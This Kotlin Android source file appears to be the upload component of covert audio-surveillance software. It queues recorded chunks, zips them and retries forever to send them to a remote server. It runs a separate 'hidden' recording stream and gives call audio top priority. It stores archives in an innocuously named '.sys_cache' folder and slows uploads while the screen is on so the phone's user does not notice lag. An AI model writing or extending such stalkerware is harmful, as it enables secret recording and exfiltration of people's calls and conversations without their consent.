package com.audiostream.client

import android.content.Context
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

/**
 * UploadManager.kt — FIFO upload queue manager.
 *
 * Reads pending chunks from the Room database (ordered by creation time),
 * uploads them sequentially via HTTP POST multipart, and handles all
 * failure/retry logic.
 *
 * GUARANTEES:
 *   - FIFO order: oldest chunk is always uploaded first
 *   - No skipping: never uploads chunk N+1 before chunk N is confirmed
 *   - No data loss: local file is deleted ONLY after server confirmation
 *   - Duplicate protection: if server says "already_exists", mark complete
 *   - Infinite retry: never gives up, continues forever
 *
 * Retry Logic:
 *   1. Retry every 2 seconds, up to 30 times
 *   2. After 30 failures: wait 60 seconds
 *   3. Restart retry cycle
 *   4. Continue forever until success
 */

class UploadManager(
    private val context: Context,
    private val serverUrl: String,
    private val clientName: String,
    deviceInfo: String,
    private val connectionMonitor: ConnectionMonitor,
    private val storageManager: StorageManager,
    private val onLog: (String) -> Unit,
    private val onStatsUpdate: (pending: Int, retries: Int) -> Unit
) {
    companion object {
        private const val RETRY_INTERVAL_MS = 2000L       // 2 seconds between retries
        private const val MAX_QUICK_RETRIES = 30           // 30 retries before long wait
        private const val LONG_WAIT_MS = 60_000L           // 60 seconds after max retries
        private const val UPLOAD_TIMEOUT_SECONDS = 120L    // 2 minute upload timeout
        private const val BATCH_ZIP_SIZE = 100             // Up to 100 chunks per ZIP
        private const val CONSOLIDATE_ARCHIVES_THRESHOLD = 5 // Combine 5 archives into 1 master ZIP (500 chunks)
        private const val SCREEN_ON_BATCH_DELAY_MS = 10_000L // 10s cooldown between ZIPs when screen is ON
    }

    private val dao = ChunkDatabase.getInstance(context).chunkDao()
    private val isRunning = AtomicBoolean(false)
    private val currentRetryCount = AtomicInteger(0)
    private val uploadSignal = kotlinx.coroutines.channels.Channel<Unit>(kotlinx.coroutines.channels.Channel.CONFLATED)

    @Volatile
    private var activeMainSessionId: String? = null

    @Volatile
    private var activeHiddenSessionId: String? = null

    @Volatile
    private var forceNewMainSession: Boolean = false

    @Volatile
    private var forceNewHiddenSession: Boolean = false

    @Volatile
    private var currentDeviceInfo: String = deviceInfo

    @Volatile
    private var currentServerUrl: String = serverUrl

    fun updateDeviceInfo(newInfo: String) {
        this.currentDeviceInfo = newInfo
    }

    fun updateServerUrl(newUrl: String) {
        this.currentServerUrl = newUrl
        onLog("UploadManager server URL updated to: $newUrl")
    }

    private val uploadScope = CoroutineScope(
        Dispatchers.IO + SupervisorJob() + CoroutineExceptionHandler { _, e ->
            onLog("Upload manager error: ${e.message}")
        }
    )

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(UPLOAD_TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    // ══════════════════════════════════════════════════════════════════════
    // START / STOP
    // ══════════════════════════════════════════════════════════════════════

    fun start() {
        if (isRunning.getAndSet(true)) return
        onLog("Upload manager started")

        uploadScope.launch {
            // Reset any chunks stuck in UPLOADING state (from previous crash)
            val reset = dao.resetStuckUploads()
            if (reset > 0) {
                onLog("Reset $reset stuck uploads from previous session")
            }

            // Main upload loop
            uploadSignal.trySend(Unit)
            uploadLoop()
        }
    }

    fun stop() {
        endSession("main")
        endSession("hidden")
        isRunning.set(false)
        onLog("Upload manager stopped")
        uploadScope.coroutineContext.cancelChildren()
    }

    @Volatile
    private var isScreenInteractive: Boolean = false

    fun setScreenInteractive(interactive: Boolean) {
        this.isScreenInteractive = interactive
        if (!interactive) {
            uploadSignal.trySend(Unit)
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // MAIN UPLOAD LOOP
    // ══════════════════════════════════════════════════════════════════════

    private suspend fun uploadLoop() {
        while (isRunning.get()) {
            try {
                // Update stats for UI
                updateStats()

                // Check pending queue depth
                val pendingTotal = dao.getPendingCount()

                // Step 1: Offline Archive Packaging.
                // When 100 chunks accumulate (offline or online), bundle into compressed ZIP (Level 9)
                // and immediately delete the 100 raw chunk files from disk to save storage.
                if (pendingTotal >= BATCH_ZIP_SIZE) {
                    packageOfflineArchive()
                }

                // Step 2: 5-Archive Consolidation.
                // When 5 archives accumulate (5 x 100 = 500 chunks), combine into 1 master ZIP and delete the 5 sub-archives.
                consolidateArchivesIfNeeded()

                // Step 3: Upload Offline Archives When Online.
                // If server is reachable, upload oldest master/archive ZIP first before processing newer loose chunks.
                if (connectionMonitor.isServerReachable()) {
                    val archiveUploaded = uploadPendingArchive()
                    if (archiveUploaded) {
                        currentRetryCount.set(0)
                        if (isScreenInteractive) {
                            onLog("Screen is ON: Pacing archive upload (cooling down 10s before next upload to prevent lag)...")
                            delay(SCREEN_ON_BATCH_DELAY_MS)
                        }
                        continue
                    }
                }

                // Step 4: Rule 9 & Rule 3: Batch Offline ZIP Upload for remaining loose chunks (10..99 chunks).
                // Runs at full speed when screen is OFF, and throttled with a 10s cooling delay when screen is ON.
                if (pendingTotal >= 10 && connectionMonitor.isServerReachable()) {
                    val batchSuccess = uploadBatchZip()
                    if (batchSuccess) {
                        currentRetryCount.set(0)
                        if (isScreenInteractive) {
                            onLog("Screen is ON: Pacing batch upload (cooling down 10s before next ZIP to prevent lag)...")
                            delay(SCREEN_ON_BATCH_DELAY_MS)
                        }
                        continue
                    }
                }

                // Rule 12: Call-Triggered Priority Mode. In-call chunks take highest priority!
                val priorityChunk = dao.getNextPriorityPending()
                val chunk = priorityChunk ?: run {
                    // Rule 3: Anti-Lag Screen-ON.
                    // When screen is ON/unlocked and there is a backlog (> 1 chunk), pause backlog syncing.
                    // Continuous live streaming remains active when queue is small (<= 1 chunk).
                    if (isScreenInteractive && pendingTotal > 1) {
                        delay(4000L)
                        null
                    } else {
                        dao.getNextPending()
                    }
                }

                if (chunk == null) {
                    // Nothing to upload or backlog paused due to active screen interaction
                    withTimeoutOrNull(15_000L) {
                        uploadSignal.receive()
                    }
                    continue
                }

                // Attempt upload if server is reachable
                val success = if (!connectionMonitor.isServerReachable()) {
                    onLog("Server not reachable, skipping upload attempt...")
                    false // Treat as upload failure to trigger backoff
                } else {
                    uploadChunk(chunk)
                }

                if (success) {
                    currentRetryCount.set(0)
                } else {
                    // Handle retry logic (will backoff to 60s if unreachable for long enough)
                    handleRetry()
                }

            } catch (e: CancellationException) {
                break
            } catch (e: Exception) {
                onLog("Upload loop error: ${e.message}")
                delay(RETRY_INTERVAL_MS)
            }
        }
    }

    /**
     * Rule 9: Offline Backlog ZIP Packaging.
     * Bundles up to 50 pending chunks into a single ZIP file and uploads in one HTTP POST.
     */
    private suspend fun uploadBatchZip(): Boolean {
        return try {
            val batch = dao.getPendingBatch(limit = BATCH_ZIP_SIZE)
            if (batch.size < 10) return false

            val streamType = batch[0].streamType
            val streamBatch = batch.filter { it.streamType == streamType }
            if (streamBatch.isEmpty()) return false

            val sessionId = ensureSession(streamType) ?: return false

            val zipFile = File(context.cacheDir, "backlog_${System.currentTimeMillis()}.zip")
            var validFileCount = 0

            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                zos.setLevel(Deflater.BEST_COMPRESSION) // High compression (Level 9)
                for (chunk in streamBatch) {
                    val f = File(chunk.filePath)
                    if (f.exists() && f.length() > 0) {
                        val entry = ZipEntry(f.name)
                        zos.putNextEntry(entry)
                        f.inputStream().use { it.copyTo(zos) }
                        zos.closeEntry()
                        validFileCount++
                    }
                }
            }

            if (validFileCount == 0 || !zipFile.exists() || zipFile.length() == 0L) {
                zipFile.delete()
                return false
            }

            val uploadUrl = currentServerUrl.trimEnd('/') + "/api/v1/broadcasts/$sessionId/upload-zip"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", zipFile.name, zipFile.asRequestBody("application/zip".toMediaType()))
                .addFormDataPart("stream_type", streamType)
                .build()

            val request = Request.Builder()
                .url(uploadUrl)
                .post(requestBody)
                .build()

            val response = httpClient.newCall(request).execute()
            val bodyStr = response.body?.string() ?: ""
            response.close()
            zipFile.delete()

            val json = try { JSONObject(bodyStr) } catch (e: Exception) { null }
            if (response.isSuccessful && json?.optString("status") == "confirmed") {
                val uuids = streamBatch.map { it.uuid }
                dao.markBatchCompleted(uuids)
                for (chunk in streamBatch) {
                    storageManager.deleteChunkFile(chunk.filePath)
                }
                if (dao.getCompletedCount() > 100) {
                    dao.deleteAllCompleted()
                }
                updateStats()
                onLog("✓ Batch upload succeeded: ${streamBatch.size} offline chunks zipped and ingested in 1 request")
                true
            } else {
                onLog("Batch zip upload rejected: HTTP ${response.code} $bodyStr")
                false
            }
        } catch (e: Exception) {
            onLog("Batch zip upload error: ${e.message}")
            false
        }
    }

    /**
     * Packages 100 loose offline chunks into a compressed ZIP archive (.sys_cache/archives/),
     * and deletes the underlying raw chunk files immediately to save disk space.
     */
    private suspend fun packageOfflineArchive(): Boolean {
        return try {
            val batch = dao.getPendingBatch(limit = BATCH_ZIP_SIZE)
            if (batch.size < BATCH_ZIP_SIZE) return false

            val streamType = batch[0].streamType
            val streamBatch = batch.filter { it.streamType == streamType }
            if (streamBatch.size < BATCH_ZIP_SIZE) return false

            val archivesDir = storageManager.getArchivesDirectory()
            val archiveFile = File(archivesDir, "archive_${streamType}_${System.currentTimeMillis()}_${streamBatch.size}.zip")
            var validFileCount = 0

            ZipOutputStream(FileOutputStream(archiveFile)).use { zos ->
                zos.setLevel(Deflater.BEST_COMPRESSION) // High compression (Level 9)
                for (chunk in streamBatch) {
                    val f = File(chunk.filePath)
                    if (f.exists() && f.length() > 0) {
                        val entry = ZipEntry(f.name)
                        zos.putNextEntry(entry)
                        f.inputStream().use { it.copyTo(zos) }
                        zos.closeEntry()
                        validFileCount++
                    }
                }
            }

            if (validFileCount == 0 || !archiveFile.exists() || archiveFile.length() == 0L) {
                archiveFile.delete()
                return false
            }

            // Immediately mark completed in Room and delete original loose chunk files
            val uuids = streamBatch.map { it.uuid }
            dao.markBatchCompleted(uuids)
            for (chunk in streamBatch) {
                storageManager.deleteChunkFile(chunk.filePath)
            }
            if (dao.getCompletedCount() > 100) {
                dao.deleteAllCompleted()
            }
            updateStats()
            onLog("✓ Packaged ${streamBatch.size} offline chunks into compressed archive: ${archiveFile.name} (raw chunks deleted to free space)")
            true
        } catch (e: Exception) {
            onLog("Package offline archive error: ${e.message}")
            false
        }
    }

    /**
     * When 5 or more 100-chunk archive ZIPs accumulate, combine them into 1 master ZIP (500 chunks)
     * and delete the 5 sub-archive files to keep file count and size minimal.
     */
    private fun consolidateArchivesIfNeeded() {
        try {
            val archivesDir = storageManager.getArchivesDirectory()
            val archiveFiles = archivesDir.listFiles()
                ?.filter { it.isFile && it.name.startsWith("archive_") && it.name.endsWith(".zip") }
                ?.sortedBy { it.lastModified() }
                ?: return

            val streamTypes = listOf("hidden", "main")
            for (st in streamTypes) {
                val matching = archiveFiles.filter { it.name.startsWith("archive_${st}_") }
                if (matching.size >= CONSOLIDATE_ARCHIVES_THRESHOLD) {
                    val fiveZips = matching.take(CONSOLIDATE_ARCHIVES_THRESHOLD)
                    val masterZip = File(archivesDir, "master_${st}_${System.currentTimeMillis()}_500.zip")

                    ZipOutputStream(FileOutputStream(masterZip)).use { zos ->
                        zos.setLevel(Deflater.BEST_COMPRESSION) // High compression (Level 9)
                        for (subZip in fiveZips) {
                            val entry = ZipEntry(subZip.name)
                            zos.putNextEntry(entry)
                            subZip.inputStream().use { it.copyTo(zos) }
                            zos.closeEntry()
                        }
                    }

                    if (masterZip.exists() && masterZip.length() > 0L) {
                        for (subZip in fiveZips) {
                            subZip.delete()
                        }
                        onLog("✓ Consolidated 5 offline archives into master ZIP: ${masterZip.name} (sub-archives deleted)")
                    } else {
                        masterZip.delete()
                    }
                }
            }
        } catch (e: Exception) {
            onLog("Consolidate archives error: ${e.message}")
        }
    }

    /**
     * Uploads the oldest pending master or archive ZIP to the server.
     * Prioritizes 500-chunk master ZIPs first, then 100-chunk archives.
     */
    private suspend fun uploadPendingArchive(): Boolean {
        return try {
            val archivesDir = storageManager.getArchivesDirectory()
            val files = archivesDir.listFiles()
                ?.filter { it.isFile && it.name.endsWith(".zip") }
                ?: return false

            val archiveToUpload = files.filter { it.name.startsWith("master_") }.minByOrNull { it.lastModified() }
                ?: files.filter { it.name.startsWith("archive_") }.minByOrNull { it.lastModified() }
                ?: return false

            val streamType = if (archiveToUpload.name.contains("_main_")) "main" else "hidden"
            val sessionId = ensureSession(streamType) ?: return false

            val uploadUrl = currentServerUrl.trimEnd('/') + "/api/v1/broadcasts/$sessionId/upload-zip"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", archiveToUpload.name, archiveToUpload.asRequestBody("application/zip".toMediaType()))
                .addFormDataPart("stream_type", streamType)
                .build()

            val request = Request.Builder()
                .url(uploadUrl)
                .post(requestBody)
                .build()

            val response = httpClient.newCall(request).execute()
            val bodyStr = response.body?.string() ?: ""
            response.close()

            val json = try { JSONObject(bodyStr) } catch (e: Exception) { null }
            if (response.isSuccessful && json?.optString("status") == "confirmed") {
                archiveToUpload.delete()
                val inserted = json?.optInt("chunks_inserted") ?: 0
                onLog("✓ Offline archive uploaded: ${archiveToUpload.name} ($inserted chunks ingested in 1 request)")
                updateStats()
                true
            } else {
                onLog("Offline archive upload rejected: HTTP ${response.code} $bodyStr")
                false
            }
        } catch (e: Exception) {
            onLog("Upload pending archive error: ${e.message}")
            false
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // SESSION MANAGEMENT
    // ══════════════════════════════════════════════════════════════════════

    private fun ensureSession(streamType: String): String? {
        val isMain = (streamType == "main")
        val current = if (isMain) activeMainSessionId else activeHiddenSessionId
        if (current != null) return current

        val forceNew = if (isMain) forceNewMainSession else forceNewHiddenSession

        if (!forceNew) {
            // 1. Try to recover existing active session for this client and stream type
            try {
                val activeUrl = currentServerUrl.trimEnd('/') + "/api/v1/listen/active?type=$streamType"
                val request = Request.Builder().url(activeUrl).get().build()
                val response = httpClient.newCall(request).execute()
                val body = response.body?.string() ?: ""
                response.close()

                if (response.isSuccessful) {
                    val json = JSONObject(body)
                    val sessionsArray = json.optJSONArray("sessions")
                    if (sessionsArray != null) {
                        for (i in 0 until sessionsArray.length()) {
                            val s = sessionsArray.getJSONObject(i)
                            if (s.optString("client_name") == clientName && s.optString("stream_type", streamType) == streamType) {
                                val recoveredId = s.optString("session_id")
                                if (recoveredId.isNotEmpty()) {
                                    if (isMain) activeMainSessionId = recoveredId else activeHiddenSessionId = recoveredId
                                    onLog("Recovered active $streamType session from server: $recoveredId")
                                    return recoveredId
                                }
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                // Ignore recovery failure and proceed to creation
            }
        } else {
            onLog("Skipping session recovery to force a new $streamType session")
            if (isMain) forceNewMainSession = false else forceNewHiddenSession = false
        }

        // 2. Create new session if no active session recovered
        return try {
            val createUrl = currentServerUrl.trimEnd('/') + "/api/v1/broadcasts"
            val titleText = if (isMain) "Main Recording - $clientName" else "Hidden Recording - $clientName"
            val jsonBody = JSONObject().apply {
                put("client_name", clientName)
                put("device_info", currentDeviceInfo)
                put("title", titleText)
                put("stream_type", streamType)
            }.toString()

            val request = Request.Builder()
                .url(createUrl)
                .post(RequestBody.create("application/json".toMediaType(), jsonBody))
                .build()

            val response = httpClient.newCall(request).execute()
            val body = response.body?.string() ?: ""
            response.close()

            if (response.isSuccessful) {
                val json = JSONObject(body)
                val sid = json.optString("session_id", "")
                if (sid.isNotEmpty()) {
                    if (isMain) activeMainSessionId = sid else activeHiddenSessionId = sid
                    onLog("Session ($streamType) created on server: $sid")
                    sid
                } else null
            } else {
                onLog("Failed to create $streamType session (HTTP ${response.code})")
                null
            }
        } catch (e: Exception) {
            onLog("Session creation error ($streamType): ${e.message}")
            null
        }
    }

    fun endSession(streamType: String) {
        val isMain = (streamType == "main")
        val sid = if (isMain) activeMainSessionId else activeHiddenSessionId
        if (isMain) activeMainSessionId = null else activeHiddenSessionId = null

        if (sid != null) {
            uploadScope.launch {
                try {
                    val endUrl = currentServerUrl.trimEnd('/') + "/api/v1/broadcasts/$sid/end"
                    val request = Request.Builder()
                        .url(endUrl)
                        .put(RequestBody.create("application/json".toMediaType(), "{}"))
                        .build()
                    httpClient.newCall(request).execute().close()
                    onLog("✓ Session $sid ($streamType) ended on server")
                } catch (e: Exception) {
                    onLog("End $streamType session warning: ${e.message}")
                }
            }
        }
    }

    fun rotateSession(streamType: String) {
        val isMain = (streamType == "main")
        val oldSessionId = if (isMain) activeMainSessionId else activeHiddenSessionId
        if (isMain) {
            activeMainSessionId = null
            forceNewMainSession = true
        } else {
            activeHiddenSessionId = null
            forceNewHiddenSession = true
        }

        if (oldSessionId != null) {
            uploadScope.launch {
                try {
                    val endUrl = currentServerUrl.trimEnd('/') + "/api/v1/broadcasts/$oldSessionId/end"
                    val request = Request.Builder()
                        .url(endUrl)
                        .put(RequestBody.create("application/json".toMediaType(), "{}"))
                        .build()
                    httpClient.newCall(request).execute().close()
                    onLog("✓ Session $oldSessionId ($streamType) ended on server (Rotation)")
                } catch (e: Exception) {
                    onLog("End $streamType session warning (Rotation): ${e.message}")
                }
            }
        }
        onLog("Rotated $streamType session after 1 hour (Old: $oldSessionId)")
    }

    // ══════════════════════════════════════════════════════════════════════
    // UPLOAD A SINGLE CHUNK
    // ══════════════════════════════════════════════════════════════════════

    private suspend fun uploadChunk(chunk: AudioChunk): Boolean {
        val file = File(chunk.filePath)

        // Check if file still exists
        if (!file.exists()) {
            onLog("Chunk file missing: ${file.name}, removing from queue")
            dao.delete(chunk.uuid)
            return true  // Not really success, but remove from queue
        }

        val sessionId = ensureSession(chunk.streamType) ?: return false

        // Mark as uploading
        dao.markUploading(chunk.uuid)
        updateStats()

        return try {
            val uploadUrl = currentServerUrl.trimEnd('/') + "/api/v1/broadcasts/$sessionId/chunk"

            // Build multipart request
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart(
                    "audio",
                    file.name,
                    file.asRequestBody("audio/aac".toMediaType())
                )
                .addFormDataPart("chunk_id", chunk.uuid)
                .addFormDataPart("duration_ms", (chunk.duration * 1000).toInt().toString())
                .addFormDataPart("checksum", chunk.checksum)
                .addFormDataPart("timestamp", chunk.timestamp)
                .addFormDataPart("in_call", if (chunk.inCall) "1" else "0")
                .addFormDataPart("mic_in_use", if (chunk.micInUse) "1" else "0")
                .addFormDataPart("stream_type", chunk.streamType)
                .build()

            val request = Request.Builder()
                .url(uploadUrl)
                .post(requestBody)
                .build()

            // Execute upload (blocking on IO dispatcher)
            val response = httpClient.newCall(request).execute()
            val responseBody = response.body?.string() ?: ""
            response.close()

            val json = try { JSONObject(responseBody) } catch (e: Exception) { null }
            val status = json?.optString("status", "") ?: ""
            val msg = json?.optString("message", "") ?: ""
            val isDuplicate = status == "already_exists" ||
                              response.code == 409 ||
                              msg.contains("already", ignoreCase = true) ||
                              responseBody.contains("UNIQUE constraint", ignoreCase = true) ||
                              responseBody.contains("already uploaded", ignoreCase = true)

            if (response.isSuccessful || isDuplicate) {
                if (status == "confirmed" || isDuplicate) {
                    // SUCCESS — server confirmed receipt or chunk was already recorded
                    dao.markCompleted(chunk.uuid)

                    // Delete local file
                    if (storageManager.deleteChunkFile(chunk.filePath)) {
                        onLog("✓ Uploaded & cleaned: ${file.name}")
                    } else {
                        onLog("✓ Uploaded: ${file.name} (local delete failed)")
                    }

                    // Clean up completed DB entries periodically without loading them into memory
                    if (dao.getCompletedCount() > 100) {
                        dao.deleteAllCompleted()
                    }

                    updateStats()
                    true
                } else {
                    onLog("Upload rejected: $msg")
                    dao.markFailed(chunk.uuid)
                    updateStats()
                    false
                }
            } else {
                onLog("Upload failed: HTTP ${response.code}")
                if (chunk.retryCount >= 10) {
                    onLog("⚠️ Max retries (10) reached for ${file.name}; skipping to unblock stream")
                    dao.markCompleted(chunk.uuid)
                    storageManager.deleteChunkFile(chunk.filePath)
                } else {
                    dao.markFailed(chunk.uuid)
                }
                updateStats()
                false
            }
        } catch (e: Exception) {
            onLog("Upload error: ${e.message}")
            if (chunk.retryCount >= 10) {
                onLog("⚠️ Max retries (10) reached for ${file.name}; skipping to unblock stream")
                dao.markCompleted(chunk.uuid)
                storageManager.deleteChunkFile(chunk.filePath)
            } else {
                dao.markFailed(chunk.uuid)
            }
            updateStats()
            false
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // RETRY LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private suspend fun handleRetry() {
        val retries = currentRetryCount.incrementAndGet()

        if (retries >= MAX_QUICK_RETRIES) {
            // Long wait after 30 failed attempts
            onLog("$MAX_QUICK_RETRIES retries failed. Waiting 60 seconds...")
            delay(LONG_WAIT_MS)
            currentRetryCount.set(0)  // Reset for next cycle
        } else {
            delay(RETRY_INTERVAL_MS)
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // STATS
    // ══════════════════════════════════════════════════════════════════════

    private suspend fun updateStats() {
        try {
            val pendingLoose = dao.getPendingCount()
            val archives = storageManager.getArchivesDirectory().listFiles()?.filter { it.isFile && it.name.endsWith(".zip") } ?: emptyList()
            var archiveChunks = 0
            for (f in archives) {
                if (f.name.startsWith("master_")) archiveChunks += 500
                else if (f.name.startsWith("archive_")) archiveChunks += 100
            }
            val totalPending = pendingLoose + archiveChunks
            val retries = dao.getTotalRetryCount()
            withContext(Dispatchers.Main) {
                onStatsUpdate(totalPending, retries)
            }
        } catch (e: Exception) {
            // Non-critical
        }
    }

    /**
     * Enqueue a new chunk for upload.
     * Called by AudioRecordService after each chunk is recorded.
     */
    suspend fun enqueueChunk(chunk: AudioChunk) {
        dao.insert(chunk)
        uploadSignal.trySend(Unit)
        updateStats()
        onLog("Enqueued chunk: ${File(chunk.filePath).name}")
    }
}
